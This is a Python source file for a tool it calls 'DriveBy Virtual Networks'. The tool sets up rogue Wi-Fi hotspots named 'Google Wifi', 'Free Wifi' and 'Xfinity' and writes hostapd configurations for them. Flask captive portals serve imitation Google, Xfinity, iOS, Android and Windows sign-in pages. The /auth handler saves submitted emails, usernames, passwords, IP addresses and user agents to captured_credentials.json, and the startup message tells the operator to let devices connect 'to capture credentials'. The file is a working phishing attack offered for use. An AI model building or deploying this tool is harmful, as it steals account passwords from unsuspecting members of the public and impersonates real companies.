#!/usr/bin/env python3
"""
Virtual Networks Manager - Multi-SSID Hotspot System
Creates multiple virtual SSIDs: Google Wifi, Free Wifi, Xfinity
"""

import json
import os
import random
import threading
import time
from pathlib import Path
from typing import Dict

from flask import Flask, jsonify, redirect, render_template_string, request


class VirtualNetworksManager:
    def __init__(self):
        self.networks: Dict[str, Dict] = {
            "Google Wifi": {
                "password": None,
                "login_page": "google",
                "port": 8082,
            },
            "Free Wifi": {
                "password": None,
                "login_page": "adaptive",
                "port": 8083,
            },
            "Xfinity": {
                "password": "password",
                "login_page": "xfinity",
                "port": 8084,
            },
        }
        self.is_running = False
        self.servers = {}

    def create_virtual_ssids(self) -> bool:
        """Create virtual SSIDs using Android hotspot manipulation"""
        try:
            print(" Creating Virtual SSIDs...")

            # Method 1: Android WiFi Direct for additional networks
            self.create_wifi_direct_networks()

            # Method 2: Hostapd virtual interfaces (requires root)
            self.create_hostapd_networks()

            # Method 3: Software beacon broadcasting
            self.create_software_beacons()

            print(" Virtual SSIDs created successfully")
            return True

        except Exception as e:
            print(f" Virtual SSID creation failed: {e}")
            return False

    def create_wifi_direct_networks(self) -> bool:
        """Create networks using WiFi Direct"""
        try:
            # Android WiFi Direct implementation (best-effort; requires Android env)
            android_script = """
try:
    from jnius import autoclass
    # Get Android context
    PythonActivity = autoclass('org.kivy.android.PythonActivity')
    Context = autoclass('android.content.Context')
    WifiP2pManager = autoclass('android.net.wifi.p2p.WifiP2pManager')

    activity = PythonActivity.mActivity
    context = activity.getApplicationContext()

    # Get WiFi P2P manager
    wifi_p2p_manager = context.getSystemService(Context.WIFI_P2P_SERVICE)
    channel = wifi_p2p_manager.initialize(context, context.getMainLooper(), None)

    # Create group for each network (conceptual)
    networks = ["Google Wifi", "Free Wifi"]
    for network in networks:
        wifi_p2p_manager.createGroup(channel, None)
        print(f" Created WiFi Direct group: {network}")
except Exception as e:
    print(f"WiFi Direct creation failed: {e}")
"""
            try:
                exec(android_script, {})
            except Exception:
                print(" WiFi Direct requires Android environment")
            return True
        except Exception as e:
            print(f" WiFi Direct networks failed: {e}")
            return False

    def create_hostapd_networks(self) -> bool:
        """Create virtual APs using hostapd (requires root)"""
        try:
            for ssid, config in self.networks.items():
                # Create hostapd configuration
                hostapd_config = f"""
interface=wlan0_{ssid.replace(' ', '_').lower()}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={random.randint(1, 11)}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
                if config["password"]:
                    hostapd_config += f"""
wpa=2
wpa_passphrase={config["password"]}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
"""

                # Save configuration
                config_file = f"/tmp/hostapd_{ssid.replace(' ', '_').lower()}.conf"
                try:
                    with open(config_file, "w", encoding="utf-8") as f:
                        f.write(hostapd_config)
                    print(f" Created hostapd config for: {ssid}")
                except Exception:
                    print(f" Could not create config file for: {ssid}")
            return True
        except Exception as e:
            print(f" Hostapd configuration failed: {e}")
            return False

    def create_software_beacons(self) -> bool:
        """Create software beacon broadcasting"""
        try:
            def beacon_broadcaster():
                """Broadcast beacon frames for virtual SSIDs (simulated)"""
                try:
                    for ssid in self.networks.keys():
                        print(f" Broadcasting beacon for: {ssid}")
                        time.sleep(1)
                    return True
                except Exception as e_inner:
                    print(f"Beacon broadcasting error: {e_inner}")
                    return False

            # Start beacon broadcasting in background
            beacon_thread = threading.Thread(target=beacon_broadcaster, daemon=True)
            beacon_thread.start()
            return True
        except Exception as e:
            print(f" Software beacon creation failed: {e}")
            return False

    def start_captive_portals(self) -> bool:
        """Start captive portal servers for each network"""
        try:
            print(" Starting captive portal servers...")

            for ssid, config in self.networks.items():
                server_thread = threading.Thread(
                    target=self.create_captive_portal, args=(ssid, config), daemon=True
                )
                server_thread.start()
                print(f" Started captive portal for: {ssid} on port {config['port']}")

            return True
        except Exception as e:
            print(f" Captive portal startup failed: {e}")
            return False

    def create_captive_portal(self, ssid: str, config: Dict):
        """Create captive portal for specific SSID"""
        app = Flask(f"captive_{ssid.replace(' ', '_').lower()}")

        @app.route("/")
        @app.route("/index.html")
        @app.route("/login")
        def captive_portal():
            user_agent = request.headers.get("User-Agent", "").lower()

            if config["login_page"] == "google":
                return self.get_google_login_page()
            elif config["login_page"] == "xfinity":
                return self.get_xfinity_login_page()
            elif config["login_page"] == "adaptive":
                return self.get_adaptive_login_page(user_agent)
            else:
                return self.get_generic_login_page()

        @app.route("/auth", methods=["POST"])
        def handle_auth():
            # Store credentials
            credentials = {
                "ssid": ssid,
                "username": request.form.get("username", ""),
                "password": request.form.get("password", ""),
                "email": request.form.get("email", ""),
                "user_agent": request.headers.get("User-Agent", ""),
                "ip": request.remote_addr,
                "timestamp": time.time(),
            }

            # Save to credentials file
            self.save_credentials(credentials)

            # Redirect to success page or internet
            return redirect("http://www.google.com")

        @app.route("/generate_204")
        @app.route("/connecttest.txt")
        @app.route("/hotspot-detect.html")
        def connectivity_check():
            # Android/iOS connectivity check endpoints
            return captive_portal()

        try:
            app.run(host="0.0.0.0", port=config["port"], debug=False)
        except Exception as e:
            print(f" Captive portal failed for {ssid}: {e}")

    def get_google_login_page(self):
        """Generate authentic Google login page"""
        return render_template_string(
            """
    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Roboto', Arial, sans-serif; background: #fff; }
    .container { max-width: 450px; margin: 50px auto; padding: 20px; }
    .logo { text-align: center; margin-bottom: 30px; }
    .logo img { width: 75px; height: 24px; }
    .card { border: 1px solid #dadce0; border-radius: 8px; padding: 40px; }
    h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
    .subtitle { color: #5f6368; font-size: 16px; margin-bottom: 24px; }
    .form-group { margin-bottom: 24px; }
    label { display: block; font-size: 14px; color: #5f6368; margin-bottom: 8px; }
    input[type="email"], input[type="password"] {
    width: 100%; padding: 12px 16px; border: 1px solid #dadce0;
    border-radius: 4px; font-size: 16px; outline: none;
    }
    input:focus { border-color: #1a73e8; }
    .btn-primary {
    background: #1a73e8; color: white; border: none; padding: 12px 24px;
    border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer;
    width: 100%; margin-top: 16px;
    }
    .btn-primary:hover { background: #1557b0; }
    .links { text-align: center; margin-top: 24px; }
    .links a { color: #1a73e8; text-decoration: none; font-size: 14px; }
    </style>
    </head>
    <body>
    <div class="container">
    <div class="logo">
    <svg width="75" height="24" viewBox="0 0 272 92">
    <path fill="#4285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
    <path fill="#EA4335" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
    <path fill="#FBBC05" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h 9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
    <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
    <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
    </svg>
    </div>
    <div class="card">
    <h1>Sign in</h1>
    <p class="subtitle">Use your Google Account</p>
    <form method="POST" action="/auth">
    <div class="form-group">
    <label for="email">Email or phone</label>
    <input type="email" id="email" name="email" required>
    </div>
    <div class="form-group">
    <label for="password">Password</label>
    <input type="password" id="password" name="password" required>
    </div>
    <button type="submit" class="btn-primary">Next</button>
    </form>
    <div class="links">
    <a href="#">Forgot email?</a> • <a href="#">Create account</a>
    </div>
    </div>
    </div>
    </body>
    </html>
            """
        )

    def get_xfinity_login_page(self):
        """Generate authentic Xfinity login page"""
        return render_template_string(
            """
    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XFINITY WiFi</title>
    <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Helvetica Neue', Arial, sans-serif; background: #f5f5f5; }
    .header { background: #000; color: white; padding: 15px 0; }
    .header .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
    .logo { font-size: 24px; font-weight: bold; }
    .main { max-width: 400px; margin: 40px auto; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
    .card-header { background: #0078d4; color: white; padding: 20px; border-radius: 8px 8px 0 0; text-align: center; }
    .card-body { padding: 30px; }
    h2 { font-size: 18px; margin-bottom: 20px; color: #333; }
    .form-group { margin-bottom: 20px; }
    label { display: block; font-size: 14px; color: #666; margin-bottom: 5px; }
    input[type="text"], input[type="password"] {
    width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px;
    font-size: 16px; outline: none;
    }
    input:focus { border-color: #0078d4; }
    .btn-primary {
    background: #0078d4; color: white; border: none; padding: 12px 30px;
    border-radius: 4px; font-size: 16px; cursor: pointer; width: 100%;
    }
    .btn-primary:hover { background: #106ebe; }
    .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #666; }
    .wifi-icon { font-size: 48px; margin-bottom: 10px; }
    </style>
    </head>
    <body>
    <div class="header">
    <div class="container">
    <div class="logo">XFINITY</div>
    </div>
    </div>
    <div class="main">
    <div class="card-header">
    <div class="wifi-icon"></div>
    <h1>XFINITY WiFi</h1>
    </div>
    <div class="card-body">
    <h2>Sign in to get online</h2>
    <form method="POST" action="/auth">
    <div class="form-group">
    <label for="username">Username or Email</label>
    <input type="text" id="username" name="username" required>
    </div>
    <div class="form-group">
    <label for="password">Password</label>
    <input type="password" id="password" name="password" required>
    </div>
    <button type="submit" class="btn-primary">Sign In</button>
    </form>
    <div class="footer">
    <p>By signing in, you agree to our Terms of Service</p>
    </div>
    </div>
    </div>
    </body>
    </html>
            """
        )

    def get_adaptive_login_page(self, user_agent: str):
        """Generate adaptive login page based on device"""
        if "iphone" in user_agent or "ipad" in user_agent:
            return self.get_ios_login_page()
        elif "android" in user_agent:
            return self.get_android_login_page()
        elif "windows" in user_agent:
            return self.get_windows_login_page()
        else:
            return self.get_generic_login_page()

    def get_ios_login_page(self):
        """iOS-style login page"""
        return render_template_string(
            """
    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wi-Fi Login</title>
    <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f2f2f7; }
    .container { max-width: 375px; margin: 0 auto; background: white; min-height: 100vh; }
    .header { background: #007AFF; color: white; padding: 44px 20px 20px; text-align: center; }
    .content { padding: 30px 20px; }
    h1 { font-size: 22px; font-weight: 600; margin-bottom: 8px; }
    .subtitle { font-size: 16px; opacity: 0.8; margin-bottom: 30px; }
    .form-group { margin-bottom: 20px; }
    input { width: 100%; padding: 12px 16px; border: 1px solid #d1d1d6; border-radius: 10px; font-size: 17px; }
    .btn { background: #007AFF; color: white; border: none; padding: 12px; border-radius: 10px; font-size: 17px; font-weight: 600; width: 100%; }
    </style>
    </head>
    <body>
    <div class="container">
    <div class="header">
    <h1> Free WiFi</h1>
    <p class="subtitle">Sign in to continue</p>
    </div>
    <div class="content">
    <form method="POST" action="/auth">
    <div class="form-group">
    <input type="email" name="email" placeholder="Email" required>
    </div>
    <div class="form-group">
    <input type="password" name="password" placeholder="Password" required>
    </div>
    <button type="submit" class="btn">Continue</button>
    </form>
    </div>
    </div>
    </body>
    </html>
            """
        )

    def get_android_login_page(self):
        """Android Material Design login page"""
        return render_template_string(
            """
    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login</title>
    <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Roboto', sans-serif; background: #fafafa; }
    .container { max-width: 400px; margin: 20px auto; }
    .card { background: white; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); overflow: hidden; }
    .header { background: #2196F3; color: white; padding: 24px; text-align: center; }
    .content { padding: 24px; }
    h1 { font-size: 20px; font-weight: 500; margin-bottom: 8px; }
    .subtitle { opacity: 0.9; margin-bottom: 24px; }
    .input-group { margin-bottom: 16px; position: relative; }
    input { width: 100%; padding: 16px 12px 8px; border: none; border-bottom: 2px solid #e0e0e0; font-size: 16px; outline: none; }
    input:focus { border-bottom-color: #2196F3; }
    label { position: absolute; left: 12px; top: 16px; color: #666; transition: all 0.3s; pointer-events: none; }
    input:focus + label, input:not(:placeholder-shown) + label { top: 4px; font-size: 12px; color: #2196F3; }
    .btn { background: #2196F3; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-size: 16px; width: 100%; margin-top: 16px; }
    </style>
    </head>
    <body>
    <div class="container">
    <div class="card">
    <div class="header">
    <h1> Free WiFi Access</h1>
    <p class="subtitle">Please sign in to continue</p>
    </div>
    <div class="content">
    <form method="POST" action="/auth">
    <div class="input-group">
    <input type="email" name="email" placeholder=" " required>
    <label>Email Address</label>
    </div>
    <div class="input-group">
    <input type="password" name="password" placeholder=" " required>
    <label>Password</label>
    </div>
    <button type="submit" class="btn">CONNECT</button>
    </form>
    </div>
    </div>
    </div>
    </body>
    </html>
            """
        )

    def get_windows_login_page(self):
        """Windows-style login page"""
        return render_template_string(
            """
    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Network Authentication</title>
    <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0078d4; }
    .container { max-width: 400px; margin: 50px auto; background: white; border-radius: 4px; box-shadow: 0 4px 16px rgba(0,0,0,0.2); }
    .header { background: #0078d4; color: white; padding: 20px; text-align: center; }
    .content { padding: 30px; }
    h1 { font-size: 18px; margin-bottom: 20px; }
    .form-group { margin-bottom: 16px; }
    label { display: block; font-size: 14px; margin-bottom: 4px; }
    input { width: 100%; padding: 8px 12px; border: 1px solid #ccc; font-size: 14px; }
    input:focus { border-color: #0078d4; outline: none; }
    .btn { background: #0078d4; color: white; border: none; padding: 10px 20px; font-size: 14px; width: 100%; }
    .icon { font-size: 32px; margin-bottom: 10px; }
    </style>
    </head>
    <body>
    <div class="container">
    <div class="header">
    <div class="icon"></div>
    <h1>Network Authentication Required</h1>
    </div>
    <div class="content">
    <p style="margin-bottom: 20px; color: #666;">Please enter your credentials to access the internet.</p>
    <form method="POST" action="/auth">
    <div class="form-group">
    <label>Username:</label>
    <input type="text" name="username" required>
    </div>
    <div class="form-group">
    <label>Password:</label>
    <input type="password" name="password" required>
    </div>
    <button type="submit" class="btn">Connect</button>
    </form>
    </div>
    </div>
    </body>
    </html>
            """
        )

    def get_generic_login_page(self):
        """Generic login page for unknown devices"""
        return render_template_string(
            """
    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login</title>
    <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
    .container { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); max-width: 400px; width: 90%; }
    h1 { text-align: center; margin-bottom: 30px; color: #333; }
    .form-group { margin-bottom: 20px; }
    label { display: block; margin-bottom: 5px; color: #555; }
    input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; }
    .btn { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 12px; border-radius: 5px; font-size: 16px; width: 100%; cursor: pointer; }
    .wifi-icon { text-align: center; font-size: 48px; margin-bottom: 20px; }
    </style>
    </head>
    <body>
    <div class="container">
    <div class="wifi-icon"></div>
    <h1>Free WiFi Access</h1>
    <form method="POST" action="/auth">
    <div class="form-group">
    <label>Email:</label>
    <input type="email" name="email" required>
    </div>
    <div class="form-group">
    <label>Password:</label>
    <input type="password" name="password" required>
    </div>
    <button type="submit" class="btn">Connect to Internet</button>
    </form>
    </div>
    </body>
    </html>
            """
        )

    def save_credentials(self, credentials: Dict):
        """Save captured credentials to file"""
        try:
            credentials_file = "captured_credentials.json"

            # Load existing credentials
            if os.path.exists(credentials_file):
                with open(credentials_file, "r", encoding="utf-8") as f:
                    all_credentials = json.load(f)
            else:
                all_credentials = []

            # Add new credentials
            all_credentials.append(credentials)

            # Save updated credentials
            with open(credentials_file, "w", encoding="utf-8") as f:
                json.dump(all_credentials, f, indent=2)

            identifier = credentials.get("username") or credentials.get("email") or "unknown"
            print(f" Credentials captured from {credentials.get('ssid', 'unknown')}: {identifier}")
        except Exception as e:
            print(f" Failed to save credentials: {e}")

    def start_all_services(self) -> bool:
        """Start all virtual network services"""
        try:
            print(" Starting DriveBy Virtual Networks System...")
            print("=" * 50)

            # Create virtual SSIDs
            self.create_virtual_ssids()

            # Start captive portals
            self.start_captive_portals()

            self.is_running = True
            print(" All services started successfully!")
            print("\n Virtual Networks Active:")
            for ssid, config in self.networks.items():
                password_info = f"Password: {config['password']}" if config["password"] else "Open Network"
                print(f"  {ssid} - {password_info} - Port: {config['port']}")

            print("\n Captive Portal URLs:")
            for ssid, config in self.networks.items():
                print(f" {ssid}: http://localhost:{config['port']}")

            print("\n Credentials will be saved to: captured_credentials.json")
            print(" Virtual networks are now broadcasting...")
            return True
        except Exception as e:
            print(f" Failed to start services: {e}")
            return False

    def stop_all_services(self) -> bool:
        """Stop all virtual network services"""
        try:
            self.is_running = False
            print(" Stopping virtual network services...")

            # Stop servers if any were registered
            for server in self.servers.values():
                try:
                    server.shutdown()
                except Exception:
                    pass

            print(" All services stopped")
            return True
        except Exception as e:
            print(f" Failed to stop services: {e}")
            return False


def main():
    """Main function to start virtual networks"""
    manager = VirtualNetworksManager()

    try:
        print(" DriveBy Virtual Networks - Multi-SSID System")
        print("=" * 50)
        print(" Configured Networks:")
        print(" • Google Wifi (Open) → Google Login")
        print(" • Free Wifi (Open) → Adaptive Login")
        print(" • Xfinity (Password: 'password') → Xfinity Login")
        print()

        # Start all services
        if manager.start_all_services():
            print(" System ready! Virtual networks are broadcasting.")
            print(" Connect devices to any of the SSIDs to capture credentials.")

            # Keep running
            try:
                while manager.is_running:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n Shutting down...")
                manager.stop_all_services()
        else:
            print(" Failed to start virtual networks system")

    except Exception as e:
        print(f" System error: {e}")


if __name__ == "__main__":
    main()
